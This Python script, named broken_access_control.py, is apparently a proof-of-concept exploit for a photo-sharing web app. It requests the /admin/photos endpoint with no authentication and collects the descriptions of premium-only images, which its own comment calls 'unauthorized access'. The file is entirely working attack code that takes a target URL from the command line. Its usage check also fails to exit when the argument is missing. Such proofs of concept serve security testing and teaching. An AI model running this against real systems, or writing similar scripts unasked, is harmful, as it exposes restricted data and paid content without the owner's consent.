import sys
import requests

# Get descriptions of premium images with unauthorized access to
# /admin/photos handler
def get_premium_photos_descriptions(url) -> list[str]:
    resp = requests.get(f'{url}/admin/photos')

    premium_descriptions: list = []
    for image in resp.json():
        if image.get('premium_only', False):
            premium_descriptions.append(image.get('description', ''))
    
    return premium_descriptions


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: broken_access_control.py <url>')
    url = sys.argv[1]

    print(get_premium_photos_descriptions(url))
